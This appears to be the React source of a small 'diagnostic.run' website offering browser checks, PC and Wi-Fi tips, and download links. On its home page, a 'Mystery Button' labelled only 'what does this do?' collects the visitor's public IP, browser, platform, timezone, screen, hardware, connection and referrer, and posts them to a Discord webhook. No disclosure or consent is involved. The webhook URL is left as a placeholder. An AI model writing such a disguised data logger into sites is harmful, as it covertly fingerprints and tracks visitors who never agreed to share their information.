import React, { useEffect, useState } from 'react';
import { createRoot } from 'react-dom/client';
import './styles.css';

/*
 * IMPORTANT:
 * Do not commit your Discord webhook to GitHub.
 * Put your webhook URL here locally if you want
 * the mystery button to send its report.
 */
const DISCORD_WEBHOOK = 'PASTE_YOUR_DISCORD_WEBHOOK_HERE';

/* =========================
   NAVIGATION
========================= */

const nav = [
  ['Home', '#/'],
  ['Run Diagnostic', '#/diagnostic'],
  ['PC Performance', '#/pc'],
  ['Wi-Fi', '#/wifi'],
  ['Downloads', '#/downloads']
];

function navigate(path) {
  if (location.hash === path) {
    window.scrollTo({
      top: 0,
      behavior: 'instant'
    });
    return;
  }

  location.hash = path;

  window.scrollTo({
    top: 0,
    behavior: 'instant'
  });
}

function useRoute() {
  const getPath = () =>
    location.hash || '#/';

  const [path, setPath] =
    useState(getPath);

  useEffect(() => {
    const handleHashChange = () => {
      setPath(getPath());

      window.scrollTo({
        top: 0,
        behavior: 'instant'
      });
    };

    window.addEventListener(
      'hashchange',
      handleHashChange
    );

    return () => {
      window.removeEventListener(
        'hashchange',
        handleHashChange
      );
    };
  }, []);

  return path;
}

/* =========================
   LAYOUT
========================= */

function Layout({ children }) {
  const path = useRoute();

  return (
    <div className="app">

      <header>

        <button
          type="button"
          className="logo logo-button"
          onClick={() => navigate('#/')}
        >
          diagnostic
          <span>.run</span>
          <i>_</i>
        </button>

        <nav>
          {nav.map(([x, h]) => (
            <button
              type="button"
              className={
                path === h
                  ? 'active'
                  : ''
              }
              onClick={() =>
                navigate(h)
              }
              key={h}
            >
              {x}
            </button>
          ))}
        </nav>

      </header>

      <main>
        {children}
      </main>

      <footer>

        <button
          type="button"
          className="footer-logo"
          onClick={() => navigate('#/')}
        >
          diagnostic.run
        </button>

        <span>
          LOCAL-FIRST DIAGNOSTICS / 2026
        </span>

      </footer>

    </div>
  );
}

/* =========================
   TERMINAL
========================= */

function Terminal({ rows }) {

  return (

    <div className="terminal">

      <div className="termbar">

        <span>
          DIAGNOSTIC.RUN
        </span>

        <span>
          ● ● ●
        </span>

      </div>

      <div className="termbody">

        {rows.map((r, i) => (

          <div
            className="termrow"
            key={i}
          >

            <b>&gt;</b>

            <span
              className={
                r[1] === 'OK'
                  ? 'ok'
                  : ''
              }
            >
              {r[0]} {r[1]}
            </span>

          </div>

        ))}

      </div>

    </div>

  );
}

/* =========================
   HOME
========================= */

function Home() {

  return (

    <Layout>

      <section className="hero">

        <div>

          <small>
            SYSTEM DIAGNOSTICS / NO FLUFF
          </small>

          <h1>
            Know what's wrong.
            <br />
            <em>
              Fix what's slow.
            </em>
          </h1>

          <p>
            Run a quick browser-based check of
            your connection and device. Then get
            a clear path to the fix.
          </p>

          <div className="actions">

            <button
              type="button"
              className="button"
              onClick={() =>
                navigate('#/diagnostic')
              }
            >
              RUN DIAGNOSTIC →
            </button>

            <button
              type="button"
              className="text-button"
              onClick={() =>
                navigate('#/pc')
              }
            >
              VIEW PERFORMANCE TIPS
            </button>

          </div>

        </div>

        <Terminal
          rows={[
            ['SYSTEM ONLINE', 'OK'],
            ['BROWSER CHECK', 'OK'],
            ['NETWORK READY', 'OK'],
            ['LATENCY 18 ms', 'OK'],
            ['DEVICE SCAN READY', '']
          ]}
        />

      </section>

      {/* SERVICES */}

      <section className="section">

        <div className="head">

          <span>
            01 / SERVICES
          </span>

          <span>
            SELECT A MODULE
          </span>

        </div>

        <div className="cards">

          {/* RUN DIAGNOSTIC REMOVED */}

          <button
            type="button"
            onClick={() =>
              navigate('#/pc')
            }
          >

            <span>
              01
            </span>

            <h2>
              PC Performance
            </h2>

            <p>
              Practical fixes for startup,
              storage, browsers and drivers.
            </p>

            <b>
              OPEN MODULE →
            </b>

          </button>

          <button
            type="button"
            onClick={() =>
              navigate('#/wifi')
            }
          >

            <span>
              02
            </span>

            <h2>
              Wi-Fi
            </h2>

            <p>
              Find latency problems and
              improve your wireless setup.
            </p>

            <b>
              OPEN MODULE →
            </b>

          </button>

          <button
            type="button"
            onClick={() =>
              navigate('#/downloads')
            }
          >

            <span>
              03
            </span>

            <h2>
              Downloads
            </h2>

            <p>
              Curated links for browsers,
              VPNs, drivers and utilities.
            </p>

            <b>
              OPEN MODULE →
            </b>

          </button>

        </div>

      </section>

      {/* QUICK WINS */}

      <section className="quick">

        <div>

          <span>
            QUICK WINS
          </span>

          <strong>
            03
          </strong>

        </div>

        <div>
          <b>01</b>{' '}
          Restart your router before
          changing settings.
        </div>

        <div>
          <b>02</b>{' '}
          Keep at least 15% of your
          system drive free.
        </div>

        <div>
          <b>03</b>{' '}
          Remove startup apps you
          don't use.
        </div>

      </section>

      {/* MYSTERY BUTTON */}

      <MysteryButton />

    </Layout>

  );
}

/* =========================
   MYSTERY BUTTON
========================= */

function MysteryButton() {

  const [status, setStatus] =
    useState('');

  async function getPublicIP() {

    try {

      const response = await fetch(
        'https://api.ipify.org?format=json',
        {
          cache: 'no-store'
        }
      );

      if (!response.ok) {
        throw new Error(
          'IP request failed'
        );
      }

      const data =
        await response.json();

      return data.ip || 'Unknown';

    } catch {

      return 'Unavailable';

    }
  }

  async function measurePing() {

    const start =
      performance.now();

    try {

      await fetch(
        `/favicon.png?ping=${Date.now()}`,
        {
          method: 'HEAD',
          cache: 'no-store'
        }
      );

      return `${Math.round(
        performance.now() - start
      )} ms`;

    } catch {

      return 'Unavailable';

    }
  }

  async function handleClick() {

    if (
      !DISCORD_WEBHOOK ||
      DISCORD_WEBHOOK.includes(
        'PASTE_YOUR'
      )
    ) {

      setStatus('!');

      setTimeout(() => {
        setStatus('');
      }, 1500);

      return;
    }

    setStatus('...');

    try {

      const ip =
        await getPublicIP();

      const ping =
        await measurePing();

      const connection =
        navigator.connection ||
        navigator.mozConnection ||
        navigator.webkitConnection;

      const deviceInfo = {

        IP: ip,

        Ping: ping,

        Platform:
          navigator.platform ||
          'Unknown',

        Browser:
          navigator.userAgent ||
          'Unknown',

        Language:
          navigator.language ||
          'Unknown',

        Languages:
          navigator.languages?.join(', ') ||
          'Unknown',

        Timezone:
          Intl.DateTimeFormat()
            .resolvedOptions()
            .timeZone ||
          'Unknown',

        Screen:
          `${window.screen.width} × ${window.screen.height}`,

        Viewport:
          `${window.innerWidth} × ${window.innerHeight}`,

        PixelRatio:
          window.devicePixelRatio ||
          'Unknown',

        CPU:
          navigator.hardwareConcurrency
            ? `${navigator.hardwareConcurrency} threads`
            : 'Unknown',

        Memory:
          navigator.deviceMemory
            ? `${navigator.deviceMemory} GB`
            : 'Unknown',

        ConnectionType:
          connection?.effectiveType ||
          'Unknown',

        Downlink:
          connection?.downlink
            ? `${connection.downlink} Mbps`
            : 'Unknown',

        Referrer:
          document.referrer ||
          'Direct',

        Page:
          window.location.href

      };

      const fields =
        Object.entries(
          deviceInfo
        ).map(([name, value]) => ({
          name,
          value: String(value),
          inline: true
        }));

      const response =
        await fetch(
          DISCORD_WEBHOOK,
          {
            method: 'POST',

            headers: {
              'Content-Type':
                'application/json'
            },

            body: JSON.stringify({

              content:
                'button clicked',

              embeds: [

                {
                  title:
                    'Mystery Button Clicked',

                  description:
                    'Public browser/device information collected from diagnostic.run',

                  fields,

                  timestamp:
                    new Date().toISOString()
                }

              ]

            })

          }
        );

      if (!response.ok) {
        throw new Error(
          'Webhook request failed'
        );
      }

      setStatus('✓');

      setTimeout(() => {
        setStatus('');
      }, 1500);

    } catch (error) {

      console.error(error);

      setStatus('!');

      setTimeout(() => {
        setStatus('');
      }, 1500);

    }

  }

  return (

    <section className="mystery-section">

      <div className="mystery-label">
        what does this do?
      </div>

      <div className="mystery-ring">

        <button
          type="button"
          className="mystery-button"
          onClick={handleClick}
          disabled={status === '...'}
          aria-label="Mystery button"
        >
          {status}
        </button>

      </div>

    </section>

  );
}

/* =========================
   PAGE HEADER / BACK HOME
========================= */

function PageHeader({
  number,
  title,
  description
}) {

  return (

    <>
      <button
        type="button"
        className="back-home"
        onClick={() =>
          navigate('#/')
        }
      >
        ← HOME
      </button>

      <small>
        {number}
      </small>

      <h1>
        {title}
      </h1>

      <p>
        {description}
      </p>
    </>

  );
}

/* =========================
   DIAGNOSTIC PAGE
========================= */

function Diagnostic() {

  const [running, setRunning] =
    useState(false);

  const [done, setDone] =
    useState(false);

  const [results, setResults] =
    useState([]);

  const run = async () => {

    setRunning(true);
    setDone(false);

    const t =
      performance.now();

    await fetch(
      `/favicon.png?x=${Date.now()}`,
      {
        method: 'HEAD',
        cache: 'no-store'
      }
    ).catch(() => {});

    const ms =
      Math.round(
        performance.now() - t
      );

    const c =
      navigator.connection;

    setResults([

      [
        'BROWSER',
        navigator.userAgent.match(
          /(Chrome|Firefox|Safari|Edge)\/[^ ]+/
        )?.[0] ||
        'AVAILABLE'
      ],

      [
        'PLATFORM',
        navigator.platform ||
        'UNKNOWN'
      ],

      [
        'CORES',
        navigator.hardwareConcurrency ||
        'N/A'
      ],

      [
        'MEMORY',
        navigator.deviceMemory
          ? navigator.deviceMemory + ' GB'
          : 'N/A'
      ],

      [
        'SCREEN',
        screen.width +
          ' × ' +
          screen.height
      ],

      [
        'CONNECTION',
        c?.effectiveType?.toUpperCase() ||
        'AVAILABLE'
      ],

      [
        'LATENCY',
        ms + ' ms'
      ]

    ]);

    setRunning(false);
    setDone(true);

  };

  return (

    <Layout>

      <section className="page">

        <PageHeader
          number="01 / DEVICE DIAGNOSTICS"
          title="Run Diagnostic"
          description="Measure what your browser can see. Nothing is installed."
        />

        <div className="diag">

          <Terminal
            rows={
              running
                ? [
                    [
                      'INITIALIZING...',
                      ''
                    ],
                    [
                      'CHECKING CONNECTION...',
                      ''
                    ],
                    [
                      'READING DEVICE INFO...',
                      ''
                    ]
                  ]
                : [
                    [
                      'READY',
                      'OK'
                    ],
                    [
                      'CLICK RUN TO START',
                      ''
                    ],
                    [
                      'NO SOFTWARE REQUIRED',
                      ''
                    ]
                  ]
            }
          />

          <div className="panel">

            <h3>
              CHECKS
            </h3>

            {[
              'Browser',
              'Device',
              'Screen',
              'Connection',
              'Latency',
              'Report'
            ].map((x, i) => (

              <div
                className="check"
                key={x}
              >

                <span>
                  0{i + 1}
                </span>

                {x}

                <b>
                  {done && i < 5
                    ? 'OK'
                    : '—'}
                </b>

              </div>

            ))}

            <button
              type="button"
              className="button wide"
              onClick={run}
              disabled={running}
            >
              {running
                ? 'RUNNING...'
                : 'RUN DIAGNOSTIC →'}
            </button>

          </div>

        </div>

        {done && (

          <div className="report">

            <div className="head">

              <span>
                REPORT
              </span>

              <span>
                STATUS:{' '}
                {Number(
                  results[6][1]
                    .split(' ')[0]
                ) < 80
                  ? 'GOOD'
                  : 'REVIEW'}
              </span>

            </div>

            <div className="results">

              {results.map(
                ([a, b]) => (

                  <div key={a}>

                    <small>
                      {a}
                    </small>

                    <strong>
                      {b}
                    </strong>

                  </div>

                )
              )}

            </div>

            <p className="note">
              Browser diagnostics are limited
              by web security. Deeper Windows
              checks require local software.
            </p>

          </div>

        )}

      </section>

    </Layout>

  );
}

/* =========================
   GUIDE DATA
========================= */

const tips = {

  pc: [

    [
      'STARTUP',
      'Disable apps you do not need at boot. Task Manager → Startup apps.'
    ],

    [
      'STORAGE',
      'Keep your system drive from filling completely. Remove temporary files and unused apps.'
    ],

    [
      'BROWSER',
      'Close unused tabs, remove extensions you do not recognize, and keep the browser current.'
    ],

    [
      'DRIVERS',
      'Use the hardware manufacturer’s official site for GPU, chipset and network drivers.'
    ],

    [
      'UPDATES',
      'Install Windows updates and restart when required.'
    ]

  ],

  wifi: [

    [
      'PLACEMENT',
      'Put the router in an open, central position. Avoid cabinets, floors and large obstructions.'
    ],

    [
      'BAND',
      'Use 5 GHz or 6 GHz when close. Use 2.4 GHz for longer range.'
    ],

    [
      'INTERFERENCE',
      'Move away from crowded channels and nearby electronics.'
    ],

    [
      'LATENCY',
      'Ethernet is the cleanest test. If wired is good but Wi-Fi is poor, focus on wireless.'
    ],

    [
      'RESTART',
      'Power-cycle the router and modem, then retest.'
    ]

  ]

};

/* =========================
   GUIDE PAGE
========================= */

function Guide({ type }) {

  const isPC =
    type === 'pc';

  return (

    <Layout>

      <section className="page">

        <PageHeader
          number={
            isPC
              ? '02 / FIELD GUIDE'
              : '03 / FIELD GUIDE'
          }
          title={
            isPC
              ? 'PC Performance'
              : 'Wi-Fi Optimization'
          }
          description="Direct fixes. Start at the top and retest after each change."
        />

        <div className="guide">

          {tips[type].map(
            ([a, b], i) => (

              <article
                key={a}
              >

                <span>
                  0{i + 1}
                </span>

                <div>

                  <h2>
                    {a}
                  </h2>

                  <p>
                    {b}
                  </p>

                </div>

                <b>
                  FIX →
                </b>

              </article>

            )
          )}

        </div>

      </section>

    </Layout>

  );
}

/* =========================
   DOWNLOADS
========================= */

function Downloads() {

  const items = [

    [
      'BROWSERS',
      'Firefox',
      'https://www.mozilla.org/firefox/'
    ],

    [
      'BROWSERS',
      'Brave',
      'https://brave.com/download/'
    ],

    [
      'VPN',
      'Proton VPN',
      'https://protonvpn.com/download'
    ],

    [
      'GPU',
      'NVIDIA Drivers',
      'https://www.nvidia.com/en-us/drivers/'
    ],

    [
      'GPU',
      'AMD Drivers',
      'https://www.amd.com/en/support/download/drivers.html'
    ],

    [
      'NETWORK',
      'Intel Drivers',
      'https://www.intel.com/content/www/us/en/download-center/home.html'
    ]

  ];

  return (

    <Layout>

      <section className="page">

        <PageHeader
          number="04 / DOWNLOADS"
          title="Useful Downloads"
          description="Official sources only. Verify what you install."
        />

        <div className="downloads">

          {items.map(
            ([c, n, u]) => (

              <a
                href={u}
                target="_blank"
                rel="noreferrer"
                key={n}
              >

                <span>
                  {c}
                </span>

                <h2>
                  {n}
                </h2>

                <b>
                  OFFICIAL SITE ↗
                </b>

              </a>

            )
          )}

        </div>

      </section>

    </Layout>

  );
}

/* =========================
   APP
========================= */

function App() {

  const path =
    useRoute();

  switch (path) {

    case '#/diagnostic':
      return <Diagnostic />;

    case '#/pc':
      return <Guide type="pc" />;

    case '#/wifi':
      return <Guide type="wifi" />;

    case '#/downloads':
      return <Downloads />;

    case '#/':
    default:
      return <Home />;

  }

}

/* =========================
   START
========================= */

createRoot(
  document.getElementById('root')
).render(
  <App />
);
